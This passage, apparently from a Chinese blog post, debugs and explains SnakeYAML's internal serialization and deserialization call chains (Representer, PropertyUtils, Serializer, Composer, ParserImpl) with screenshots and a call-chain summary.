+<p>调试到这里来计算一下 Introspector.getBeanInfo(type).getPropertyDescriptors() 的结果，可以看到返回结果中不包含既没有 getter 也没有 setter 的属性：<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20250502143006-zoz5ro7.png"></p>
+<p>接着往下，property.getReadMethod() 实际获取 getter 方法，随后排除掉 getClass（这是超类的方法）和 transient 字段，剩余 getter 方法对应的字段将被添加进 properties 中，另外没有 getter 方法的字段也会被添加进 properties 中，这里添加的字段对应的值是 MethodProperty 。故而这第一步就是获取了<strong>非 transient 字段（注意前置条件是有 getter 或 setter ，不过一般情况下来说要有就是两者都有，因为 JavaBean 规范要求非公有属性需要有 getter 和 setter 方法，但这一规范不一定要遵守）：</strong></p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20250504134119-j0au1ie.png">
+
+<p>default 模式下的第二步则是通过反射获取并补充添加<strong>所有非 static 非 transient 的 public 字段</strong>，且字段对应的值为 FieldProperty，这里肯定会存在重合的情况，比如说一个属性既是 public 修饰又有自己的 getter 方法，由于 properties 是一个 HashMap ，被 put 两次的话键相同值是会覆盖的，后来的 FieldProperty 会覆盖掉前面的 MethodProperty：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20250504134149-mg7piss.png">
+
+<p>经过这一步之后，我们前面测试用的 test_no_getterAndSetter 字段也会被添加进 properties 中：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20250502143600-crbibr2.png">
+
+<p>这里的 MethodProperty 与 FieldProperty 分别有什么意义呢？<strong>使用 MethodProperty 的字段在获取值时会调用其 getter 方法，而使用 FieldProperty 的字段会通过反射获取值</strong>，具体的逻辑在后面。</p>
+<p>所以我们可以简单的总结一下：<strong>public 属性通过反射获取值，非 public 但有 getter 方法的属性通过 getter 获取值</strong>。</p>
+<p>处理完所有属性后，如果 properties 还是空的且存在不可访问的字段，抛出异常。最后将生成的属性映射存入缓存，并返回。</p>
+<p>显然，这里就是获取序列化属性的核心点，决定了哪些属性可以被序列化。</p>
+<p>关于 BeanAccess 什么时候会是 FIELD 模式，我们可以在 PropertyUtils 中找到两个地方对 beanAccess 属性进行了操作：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20250425111706-liqa3ol.png">
+
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20250425111752-n616wvd.png">
+
+<p>可以看到，如果系统在 Android 环境上运行，那么只允许使用 FIELD 模式（注释中解释了原因，Android 环境下缺乏 java.beans 包，所以 SnakeYAML 在 Android 上只能通过直接访问字段来处理属性，而不是使用标准的 JavaBean 机制。）</p>
+<p>其他环境也可以通过 PropertyUtils#setBeanAccess 手动设置为 FIELD 模式。那么可以知道大多数情况都会走默认模式。</p>
+<p>好嘛，回到 PropertyUtils#createPropertySet(Class&lt;? extends Object&gt;, BeanAccess) 方法，后续还会对属性做一个可读可写的判断：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20250425122541-x1ei678.png">
+
+<p>什么意思呢，就是说可读可写，或者只读的属性才能通过。看似是这样，实际测试下来发现我五个属性都能过：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20250502144356-eyux82j.png">
+
+<p>说明这跟 getter、setter 方法没关系，是他自己的方法恒定返回 true ：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20250502144757-4eb35lx.png">
+
+<p>所以这个判断就跟没有一样。</p>
+<p>后面没什么看的了，回到 Representer$RepresentJavaBean#representData(Object) ，我们前面是跟到了 getProperties 分支，现在来看 representJavaBean：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20250502145459-0bsxp7l.png">
+
+<p>跟进 Representer#representJavaBean(Set<Property>, Object)，这里面就是将 properties 转换为 MappingNode 节点树的过程：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20250504132907-0gac1c0.png">
+
+<p>MappingNode 节点主要由 tag 和 value 组成，tag 就是序列化的类名，value 中则存放着解析自 properties 的一个个元组 tuple 。</p>
+<p>同时我们注意到这边调用 property.get 去获取了属性值 memberValue ，这里就是我们获取属性值的地方了，对应到前面的 MethodProperty ，它的 get 方法是通过调用 getter 方法来获取属性值：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20250504135259-aktkyxg.png">
+
+<p>如果是 FieldProperty ，则是通过反射获取属性值：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20250504140534-9ejiepz.png">
+
+<p>随后通过调用 representJavaBeanProperty 方法获取了元组 tuple ，将成员属性（property）和对应的值（memberValue）传入。</p>
+<p>representJavaBeanProperty 内部对属性名和属性值分别做处理，都是调的 representData ：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20250503165647-nytn8jg.png">
+
+<p>这个 BaseRepresenter#representData(Object) 我们前面已经分析过了，它用来获取一个对象的表示数据，这里键和值都是基本类型，不会走先前那个最后的默认逻辑。如果属性中有复杂对象类型，那可能会递归式的再经过一遍前面的处理。</p>
+<p>那么这部分看的差不多了，一路返回返回，回到 Yaml#dumpAll(Iterator&lt;? extends Object&gt;, Writer, Tag)，第一部分将对象转换为 node 节点树，我们已经跟完了。下面来看第二部分，将节点树转换为序列化数据：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20250503171351-45brz61.png">
+
+<p>跟进 Serializer#serialize(Node) ：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20250503171718-hl34xyn.png">
+
+<p>其中，首尾的两行 DocumentStartEvent 和 DocumentStartEvent 标志着 YAML 文档的开始和结束。this.emitter.emit 负责将开始或结束事件发送出去。其中主要是调用了 anchorNode 和 serializeNode 来解析 node 节点树。</p>
+<p>先来看 Serializer#anchorNode(Node) ，主要是将节点 node 和对应的锚点 anchor 添加进 this.anchors 属性中，对于子节点，也是递归式的调用自身，并且分了 SequenceNode 和 MappingNode 两种情况，分别处理序列类型（List&#x2F;Array）和映射类型（Map&#x2F;Bean）：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20250503184301-g4ouxxx.png">
+
+<p>那么接下来我们来看 Serializer#serializeNode(Node, Node) ，这里给了三种处理模式：</p>
+<p>标量(Scalar) → 处理基本类型值</p>
+<p>序列(Sequence) → 处理 List&#x2F;Array 结构</p>
+<p>（默认）映射(Mapping) → 处理 Map&#x2F;JavaBean 结构</p>
+<p>最开始会进入默认模式：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20250504144829-yohcil0.png">
+
+<p>这边是调用自身对属性名称和属性值分别处理，递归式的。最后将结果发送给 this.emitter ，那么我们也来递归式的分析一下。</p>
+<p>这边再次进入到 Serializer#serializeNode(Node, Node) ，处理的是 age 属性，由于是 int 基本类型，会直接进入到 Scalar 的处理逻辑中：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20250503203119-3y2gr9d.png">
+
+<p>这里首先会调用 this.resolver.resolve 去处理两次，分别是第三个参数为 true 和 false 的情况。</p>
+<p>Resolver#resolve(NodeId, String, boolean) 实际也没什么好看的，就走到最后返回 Tag.STR ：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20250503212612-a7sgnl1.png">
+
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20250503212512-1fbsm0r.png">
+
+<p>resolve 处理完以后，后面封装了一个元组 tuple ，又用这个元组创建了一个 event ，最后把这个 event 发送给了 this.emitter ，这部分就不分析了。</p>
+<p>由 node 节点树转换为序列化数据的过程就是做了各种封装，结果通过调用 this.emitter.emit 直接输出到数据流，而不是存储在内存中。</p>
+<h4 id="调用链总结"><a href="#调用链总结" class="headerlink" title="调用链总结"></a>调用链总结</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">Yaml#dump(Object)</span><br><span class="line">Yaml#dumpAll(Iterator&lt;? extends Object&gt;)</span><br><span class="line">Yaml#dumpAll(Iterator&lt;? extends Object&gt;, Writer, Tag) </span><br><span class="line">	-&gt; BaseRepresenter#represent(Object) # 分支一：将 JavaBean 转换为 node 节点树</span><br><span class="line">	   BaseRepresenter#representData(Object)</span><br><span class="line">	   Representer$RepresentJavaBean#representData(Object)</span><br><span class="line">	       -&gt; Representer#getProperties(Class&lt;? extends Object&gt;)</span><br><span class="line">			  PropertyUtils#getProperties(Class&lt;? extends Object&gt;)</span><br><span class="line">			  PropertyUtils#getProperties(Class&lt;? extends Object&gt;, BeanAccess)</span><br><span class="line">			  PropertyUtils#createPropertySet(Class&lt;? extends Object&gt;, BeanAccess)</span><br><span class="line">			  PropertyUtils#getPropertiesMap(Class&lt;?&gt;, BeanAccess) </span><br><span class="line">			  # public 属性设置为 FieldProperty ，非 public 但有 getter 方法的属性设置为 MethodProperty </span><br><span class="line">		   -&gt; Representer#representJavaBean(Set&lt;Property&gt; properties, Object javaBean)</span><br><span class="line">			  -&gt; Property#get(Object) </span><br><span class="line">				 # 对于 FieldProperty 反射获取值，对于 MethodProperty 调用 getter 获取值</span><br><span class="line">			  -&gt; Representer#representJavaBeanProperty(Object, Property, Object, Tag) </span><br><span class="line">				 # 递归式地调用 BaseRepresenter#representData(Object) 来处理子节点（类属性）</span><br><span class="line">	-&gt; Serializer#serialize(Node) # 分支二：将 node 节点树转换为序列化数据</span><br><span class="line">	       -&gt; Serializer#anchorNode(Node) # 递归式获取节点 node 对应的锚点 anchor</span><br><span class="line">		   -&gt; Serializer#serializeNode(Node, Node) # 递归式将节点 node 封装（序列化）</span><br></pre></td></tr></table></figure>
+
+<p>‍</p>
+<h3 id="0x2-反序列化分析"><a href="#0x2-反序列化分析" class="headerlink" title="0x2 反序列化分析"></a>0x2 反序列化分析</h3><p>当执行 yaml.load() 时，实际会经过以下关键阶段：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">YAML文本 → Parser (生成事件流) → Composer (构建节点树) → Constructor (转换为Java对象)</span><br></pre></td></tr></table></figure>
+
+<p>那么还是以上面的 demo 为例，我们来跟进一下代码：</p>
+<p>首先下断点：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20250419202147-a2edofn.png">
+
+<p>跟进 yaml.load ，这里调用 Yaml#loadFromReader ，并将传入的 yaml 数据封装为 StreamReader 作为参数传入，第二个参数为 ​Object.class：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20250419202236-ash0975.png">
+
+<p>继续跟进，Yaml#loadFromReader 首先将传入的 StreamReader 对象进一步封装为 ParserImpl 对象，再继续封装成 Composer 对象，并将其封装进 constructor ：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20250419202519-i4xws4r.png">
+
+<p>这个 constructor 是一个 BaseConstructor 对象，并在构造方法中赋值：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20250419203035-j0wjaek.png">
+
+<p>当我们调用无参构造方法时是会调用这个构造方法的，使用的都是默认配置：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20250419203254-4dxnopx.png">
+
+<p>回到 Yaml#loadFromReader ，接下来调用 constructor.getSingleData ：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20250419203658-5xe7wc1.png">
+
+<p>跟进 BaseConstructor#getSingleData(Class&lt;?&gt;) ：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20250419203943-cv23ee1.png">
+
+<p>第一步从刚刚封装的 composer 里面获取一个 SingleNode ，内部其实是调用 getNode() 来获取。</p>
+<p>跟进 Composer#getSingleNode() ，这里两次调用 parser.getEvent() ，分别用于消费 STREAM_START 事件（流开始标记）和 STREAM_END 事件（流结束标记），这是由于 YAML 规范要求流必须以 STREAM_START 开始，消费后才能开始解析文档，并在最后清理解析器状态，确保后续操作不会残留未处理事件 ：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20250419204159-ut2xpyf.png">
+
+<p>我们来看 Composer#getNode() ，这个方法的核心是通过调用 composeNode 方法来构建节点树，父节点为 null ，表示从根节点开始构造：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20250419205818-e1buhws.png">
+
+<p>跟进 Composer#composeNode(Node) ：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20250419210421-metwhbh.png">
+
+<p>这段代码是 SnakeYAML 库中负责构建节点树的核心方法。方法接收一个父节点 parent ，然后根据解析器的事件类型来处理不同的节点情况。我们主要关注 else 部分的处理逻辑，还是熟悉的三个处理方法，即分别对应 Scalar（标量），Sequence（序列）和默认的 Mapping（映射）处理逻辑的三个方法：composeScalarNode、composeSequenceNode 和 composeMappingNode ，第一次解析也是毫不意外地走到了 composeMappingNode ，盲猜之后是对字段的递归解析。</p>
+<p>跟进 Composer#composeMappingNode(String) ，这边也确实调用了 composeMappingChildren 去处理子节点：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20250504171527-b64lc85.png">
+
+<p>继续跟进 Composer#composeMappingChildren(List<NodeTuple>, MappingNode)，这边分别调用 composeKeyNode 和 composeValueNode 获取了属性名和属性值：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20250504171738-1jxeap3.png">
+
+<p>composeKeyNode 和 composeValueNode 这两个方法都是调用当前类的 composeNode ：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20250504171840-sn7k4pm.png">
+
+<p>喜欢套娃？继续跟进 Composer#composeNode(Node parent) ，发现我们又回来了，但是熟悉的配方，不同的做法，这一次我们是调用到了 composeScalarNode 去解析 Person 类的属性，具体是哪个属性呢？我也不知道，还得跟进去看看：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20250504172150-rd4vywo.png">
+
+<p>跟进 Composer#composeScalarNode(String)：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20250504172610-0ooq51r.png">
+
+<p>发现其实在第一步 parser.getEvent() 就获取到了我们的成员属性 age ：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20250504173241-bmy0b1b.png">
+
+<p>这边将 age 的信息封装成了一个节点并返回。</p>
+<p>对属性值的处理 composeValueNode 同样最后也是走到这里，只不过这里调用 parser.getEvent() 获取到的是属性值：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20250504174103-whlk7th.png">
+
+<p>看来这个 parser.getEvent() 之中很有玄妙，跟进 ParserImpl#getEvent() ，这里调用了一次 peekEvent ，然后返回了 currentEvent 属性值：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20250504174245-hbqsvcm.png">
+
+<p>跟进 ParserImpl#peekEvent() ，这里是调用 state.produce() 来获取了 currentEvent 属性值：</p>
